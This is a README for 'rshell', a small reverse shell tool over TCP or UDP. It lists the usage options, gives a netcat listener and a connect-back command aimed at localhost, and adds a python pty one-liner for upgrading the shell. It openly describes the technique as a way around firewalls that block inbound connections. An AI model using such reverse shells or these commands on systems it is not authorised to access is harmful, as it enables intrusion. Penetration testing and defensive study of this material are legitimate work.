# reverse-shell

A simple reverse shell over TCP or UDP.

## Overview

A reverse shell is a network tool that grants shell access to a remote host.
As opposed to other remote login tools such as telnet and ssh, a reverse shell
is initiated by the remote host. This technique of connecting outbound from
the remote network allows for circumvention of firewalls that are configured
to block inbound connections only.

## Usage

```
usage: rshell [options] <host> <port> [peer]
arguments:
        host        : mandatory specific host to bind or connect (could be "any" in listen mode)
        port        : mandatory specific port to bind or connect
        peer        : optional peer address to accept connection from in listen mode
options:
        -4         : use IPv4 socket
        -6         : use IPv6 socket
        -f         : foreground mode (eg: no fork)
        -h         : display this and exit
        -l         : listen mode
        -s <shell> : give the path shell (default: /bin/sh)
        -u         : use an UDP socket
        -v         : display version and exit
```

## Example

On the 'client' side, we create the listener :
```
nc -lp 4445
```
or
```
./rshell -l 127.0.0.1 4445
```

On the 'server' side, we bind the shell to the listener :
```
./rshell 127.0.0.1 4445
```

## Tip
Once you have the shell, if you want to be more confortable :
```
python -c 'import pty; pty.spawn("/bin/bash")'
```
